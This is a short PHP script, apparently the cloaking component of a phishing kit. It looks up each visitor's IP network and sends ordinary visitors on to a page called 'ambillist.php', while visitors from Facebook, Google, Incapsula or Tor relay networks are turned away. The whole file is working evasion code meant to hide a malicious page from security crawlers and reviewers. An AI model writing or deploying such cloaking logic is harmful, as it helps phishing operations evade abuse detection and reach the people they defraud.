<?php

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';

      $newip = explode(',', $ipaddress);

    $ipbaru=$newip[0];

    return $ipbaru;
}


function getstatusipuser($ipbaru){
$ip = json_decode(file_get_contents(sprintf('https://ip.nf/%s.json', $ipbaru)));
$myisp = strtolower($ip->ip->asn);
$ispfb="zwiebelfreunde";
$word="facebook";
$word2="incapsula";
$word3="google";
if (strpos($myisp, $word) !== FALSE) {
  $status="tidakaman";
}elseif (strpos($myisp, $word2) !== FALSE) {
    $status="tidakaman";
}elseif (strpos($myisp, $ispfb) !== FALSE) {
  $status="tidakaman";
}elseif (strpos($myisp, $word3) !== FALSE) {
    $status="tidakaman" ;
}else
{
  $status="aman";
}
  return $status;
}



if (getstatusipuser(get_client_ip())=="aman") {
    
 header('Location: ambillist.php');

  # code...
}
else {

echo ('Location: https://www.facebook.com');


}